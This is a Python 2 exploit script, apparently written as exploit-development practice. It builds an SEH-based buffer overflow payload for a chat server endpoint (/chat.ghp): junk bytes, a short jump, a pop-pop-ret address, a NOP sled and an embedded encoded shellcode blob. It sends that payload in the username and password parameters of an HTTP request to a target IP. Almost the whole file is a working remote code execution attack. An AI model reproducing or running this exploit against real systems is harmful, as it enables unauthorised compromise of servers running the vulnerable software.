#!/usr/bin/env python

import socket
import sys

s = None
def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def badchars(ip, port):
	# SEH exploit development formula
	#                    --------------             
	#		     |            |
	#  expolit = junk + nseh + seh + nop + shellcode + padding
	#                    |<-----|
    global s
    junk = 217 * "\x41"  # we have already calculated in previous script
    seh  = "\xE5\x0C\x01\x10"  # pop r32 pop re32 retn in SLLEAY32.DLL 
    #seh  = 4 * "\x42"  # pop r32 pop re32 retn in SLLEAY32.DLL 
    nseh = "\xEB\x0A\x90\x90" # jump ten bytes 2 byte \x90 and 4 byte seh area
    #nseh = 4 * "\x43" # jump ten bytes 2 byte \x90 and 4 byte seh area
    nop  = 16 * "\x90" 
    # bad characthers are \x00 \x20 
    shellcode = ("\xd9\xc0\xbf\xdb\xf3\x43\xb7\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x7a\x17\x83\xea\xfc\x03\xa1\xe0\xa1\x42\xa9\xef\xa4"
"\xad\x51\xf0\xc8\x24\xb4\xc1\xc8\x53\xbd\x72\xf9\x10\x93\x7e"
"\x72\x74\x07\xf4\xf6\x51\x28\xbd\xbd\x87\x07\x3e\xed\xf4\x06"
"\xbc\xec\x28\xe8\xfd\x3e\x3d\xe9\x3a\x22\xcc\xbb\x93\x28\x63"
"\x2b\x97\x65\xb8\xc0\xeb\x68\xb8\x35\xbb\x8b\xe9\xe8\xb7\xd5"
"\x29\x0b\x1b\x6e\x60\x13\x78\x4b\x3a\xa8\x4a\x27\xbd\x78\x83"
"\xc8\x12\x45\x2b\x3b\x6a\x82\x8c\xa4\x19\xfa\xee\x59\x1a\x39"
"\x8c\x85\xaf\xd9\x36\x4d\x17\x05\xc6\x82\xce\xce\xc4\x6f\x84"
"\x88\xc8\x6e\x49\xa3\xf5\xfb\x6c\x63\x7c\xbf\x4a\xa7\x24\x1b"
"\xf2\xfe\x80\xca\x0b\xe0\x6a\xb2\xa9\x6b\x86\xa7\xc3\x36\xcf"
"\x04\xee\xc8\x0f\x03\x79\xbb\x3d\x8c\xd1\x53\x0e\x45\xfc\xa4"
"\x71\x7c\xb8\x3a\x8c\x7f\xb9\x13\x4b\x2b\xe9\x0b\x7a\x54\x62"
"\xcb\x83\x81\x25\x9b\x2b\x7a\x86\x4b\x8c\x2a\x6e\x81\x03\x14"
"\x8e\xaa\xc9\x3d\x25\x51\x9a\x4b\xde\x3f\x4e\x24\x1c\xbf\x6f"
"\x0f\xa9\x59\x05\x7f\xfc\xf2\xb2\xe6\xa5\x88\x23\xe6\x73\xf5"
"\x64\x6c\x70\x0a\x2a\x85\xfd\x18\xdb\x65\x48\x42\x4a\x79\x66"
"\xea\x10\xe8\xed\xea\x5f\x11\xba\xbd\x08\xe7\xb3\x2b\xa5\x5e"
"\x6a\x49\x34\x06\x55\xc9\xe3\xfb\x58\xd0\x66\x47\x7f\xc2\xbe"
"\x48\x3b\xb6\x6e\x1f\x95\x60\xc9\xc9\x57\xda\x83\xa6\x31\x8a"
"\x52\x85\x81\xcc\x5a\xc0\x77\x30\xea\xbd\xc1\x4f\xc3\x29\xc6"
"\x28\x39\xca\x29\xe3\xf9\xfa\x63\xa9\xa8\x92\x2d\x38\xe9\xfe"
"\xcd\x97\x2e\x07\x4e\x1d\xcf\xfc\x4e\x54\xca\xb9\xc8\x85\xa6"
"\xd2\xbc\xa9\x15\xd2\x94")
    padding = (2000 - 225 - 16) * '\x44'
    payload = junk + nseh + seh + nop + shellcode + padding 

    header = "GET /chat.ghp?username=" + payload + "&password="+ payload + "&room=1 HTTP/1.1\r\n"
    header += "HOST:127.0.0.1\r\n"
    header += "\r\n\r\n"

    print "Connecting to target...."
    s.connect((ip, port))
    #s.recv(1024)
    s.send(header)
    print "Disconnecting from target..."
    s.close()


def main():
    connect()
    badchars(sys.argv[1], 80)

main()
    
